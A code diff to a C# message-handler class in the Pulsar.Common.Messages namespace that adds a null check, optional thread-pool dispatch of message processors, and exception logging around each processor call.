@@ -1,7 +1,10 @@
 ﻿using Pulsar.Common.Messages.Other;
 using Pulsar.Common.Networking;
+using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.Linq;
+using System.Threading;
 
 namespace Pulsar.Common.Messages
 {
@@ -50,8 +53,14 @@ namespace Pulsar.Common.Messages
         /// </summary>
         /// <param name="sender">The sender of the message.</param>
         /// <param name="msg">The received message.</param>
-        public static void Process(ISender sender, IMessage msg)
+        /// <param name="dispatchAsync">When true, executes each handler on the thread pool to avoid blocking the caller.</param>
+        public static void Process(ISender sender, IMessage msg, bool dispatchAsync = true)
         {
+            if (msg == null)
+            {
+                return;
+            }
+
             IEnumerable<IMessageProcessor> availableProcessors;
             lock (SyncLock)
             {
@@ -61,7 +70,73 @@ namespace Pulsar.Common.Messages
             }
 
             foreach (var executor in availableProcessors)
-                executor.Execute(sender, msg);
+            {
+                if (dispatchAsync)
+                {
+                    QueueProcessorExecution(executor, sender, msg);
+                }
+                else
+                {
+                    ExecuteProcessorSafely(executor, sender, msg);
+                }
+            }
+        }
+
+        private static void QueueProcessorExecution(IMessageProcessor processor, ISender sender, IMessage message)
+        {
+            var context = new MessageDispatchContext
+            {
+                Processor = processor,
+                Sender = sender,
+                Message = message
+            };
+
+            ThreadPool.UnsafeQueueUserWorkItem(DispatchCallback, context);
+        }
+
+        private static void ExecuteProcessorSafely(IMessageProcessor processor, ISender sender, IMessage message)
+        {
+            try
+            {
+                processor.Execute(sender, message);
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"[MessageHandler] Processor '{processor?.GetType().Name}' threw an exception: {ex}");
+            }
+        }
+
+        private static readonly WaitCallback DispatchCallback = state =>
+        {
+            if (state is MessageDispatchContext context)
+            {
+                context.Invoke();
+            }
+        };
+
+        private sealed class MessageDispatchContext
+        {
+            public IMessageProcessor Processor;
+            public ISender Sender;
+            public IMessage Message;
+
+            public void Invoke()
+            {
+                try
+                {
+                    Processor?.Execute(Sender, Message);
+                }
+                catch (Exception ex)
+                {
+                    Debug.WriteLine($"[MessageHandler] Processor '{Processor?.GetType().Name}' threw an exception: {ex}");
+                }
+                finally
+                {
+                    Processor = null;
+                    Sender = null;
+                    Message = null;
+                }
+            }
         }
     }
 }
